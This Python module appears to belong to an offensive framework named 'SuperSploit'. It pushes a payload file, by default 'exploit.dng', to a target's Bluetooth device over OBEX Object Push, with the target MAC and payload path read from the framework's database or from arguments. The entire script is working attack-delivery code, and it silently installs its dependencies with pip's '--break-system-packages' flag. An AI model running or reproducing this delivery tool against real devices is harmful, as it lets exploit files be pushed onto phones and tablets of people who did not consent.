
import sys
import os
import subprocess

# Resolve framework root for core imports
_current_dir = os.path.dirname(os.path.abspath(__file__))
_source_dir = os.path.abspath(os.path.join(_current_dir, ".."))
if _source_dir not in sys.path:
    sys.path.append(_source_dir)

try:
    from core.database import DatabaseManagment
except ImportError:
    DatabaseManagment = None

# Dependency Check: bluetooth and PyOBEX
try:
    import bluetooth
except ImportError:
    print("[*] Installing PyBluez...")
    subprocess.run([sys.executable, "-m", "pip", "install", "pybluez2", "--break-system-packages"], capture_output=True)
    import bluetooth

try:
    from PyOBEX.client import Client
except ImportError:
    print("[*] Installing PyOBEX...")
    subprocess.run([sys.executable, "-m", "pip", "install", "PyOBEX", "--break-system-packages"], capture_output=True)
    from PyOBEX.client import Client


def send_file_obex(mac, file_path):
    channel = 12 # OBEX Object Push
    print(f"[*] Initializing SuperSploit OBEX Transfer")
    print(f"[*] Target MAC: {mac}")
    print(f"[*] Payload:    {file_path}")
    
    if not os.path.exists(file_path):
        print(f"[-] Error: File {file_path} not found.")
        return

    try:
        print(f"[*] Attempting to connect to {mac} on channel {channel}...")
        client = Client(mac, channel)
        client.connect()
        print("[+] OBEX Connection established!")
        
        with open(file_path, "rb") as f:
            data = f.read()
        
        name = os.path.basename(file_path)
        print(f"[*] Pushing {name} ({len(data)} bytes)...")
        client.put(name, data)
        print(f"[+] File {name} sent successfully!")
        
        client.disconnect()
        print("[*] Session closed.")
    except Exception as e:
        print(f"[-] OBEX Error: {e}")

if __name__ == "__main__":
    db = {}
    if DatabaseManagment:
        db = DatabaseManagment.get()
    
    # Get variables from database
    target_mac = db.get("R_MAC", "") # Default to Tab A8 for now if not set
    if target_mac == "":
        print("[!] set the R_MAC value in the supersploit db")
        sys.exit()
    file_to_send = db.get("PAYLOAD_PATH", "exploit.dng")
    
    # Allow command line overrides
    if len(sys.argv) > 1:
        target_mac = sys.argv[1]
    if len(sys.argv) > 2:
        file_to_send = sys.argv[2]

    if not target_mac:
        print("[-] Error: R_MAC not set in database.")
        sys.exit(1)

    send_file_obex(target_mac, file_to_send)
